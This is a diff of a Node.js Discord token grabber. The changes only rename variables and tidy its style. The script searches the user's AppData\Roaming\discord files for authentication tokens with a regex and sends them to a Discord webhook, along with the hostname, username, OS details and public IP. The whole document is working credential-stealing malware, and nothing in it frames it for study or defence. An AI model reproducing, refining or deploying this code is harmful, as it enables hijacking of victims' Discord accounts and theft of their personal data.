@@ -8,9 +8,9 @@ const os = require("os")
 const fs = require("fs")
 
 // Variables
-const Webhook = new discord.WebhookClient("webhookID", "webhookToken")
+const webhook = new discord.WebhookClient("webhookID", "webhookToken")
 
-var TSS = {
+var tss = {
     homedir: os.userInfo().homedir,
     regex: new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/, "g"),
     tokens: []
@@ -34,12 +34,10 @@ function directory_files(dir, done) {
                 if (stat && stat.isDirectory()) {
                     directory_files(file, function (err, res) {
                         results = results.concat(res)
-
                         if (!--list_length) done(null, results)
                     })
                 } else {
                     results.push(file)
-                    
                     if (!--list_length) done(null, results)
                 }
             })
@@ -47,43 +45,35 @@ function directory_files(dir, done) {
     })
 }
 
-TSS.send = async function(){
+tss.send = async function(){
     const IP = await publicIP.v4()
 
-    Webhook.send("```" + `OS Type: ${os.type()}
+    webhook.send("```" + `OS Type: ${os.type()}
 OS Platform: ${os.platform()}
 OS Hostname: ${os.hostname()}
             
 OS Username: ${os.userInfo().username}
 IP: ${IP}
-Discord tokens found: ${TSS.tokens.join(", ")}` + "```",).then(()=>{
+Discord tokens found: ${tss.tokens.join(", ")}` + "```",).then(()=>{
         process.exit()
-    }).catch(()=>{
-        process.exit()
-    })
+    }).catch(()=>{process.exit()})
 }
 
 //Main
-if(!fs.existsSync(`${TSS.homedir}\\AppData\\Roaming\\discord`)) process.exit()
+if(!fs.existsSync(`${tss.homedir}\\AppData\\Roaming\\discord`)) process.exit()
 
-directory_files(`${TSS.homedir}\\AppData\\Roaming\\discord`, function(err, files){
-    if(err){
-        process.exit()
-    }
+directory_files(`${tss.homedir}\\AppData\\Roaming\\discord`, function(err, files){
+    if(err) return process.exit()
 
     files.forEach(file =>{
         try{
             const data = fs.readFileSync(file, "utf8")
         
-            if(data.match(TSS.regex)){
-                for( const token of data.match(TSS.regex) ){
-                    if(TSS.tokens.indexOf(token) === -1) TSS.tokens.push(token)
-                }
-            }
+            if(data.match(tss.regex)) for( const token of data.match(tss.regex) ) if(tss.tokens.indexOf(token) === -1) tss.tokens.push(token)
         }catch{}
     })
 
-    if(!TSS.tokens.length) process.exit()
+    if(!tss.tokens.length) process.exit()
 
-    TSS.send()
+    tss.send()
 })
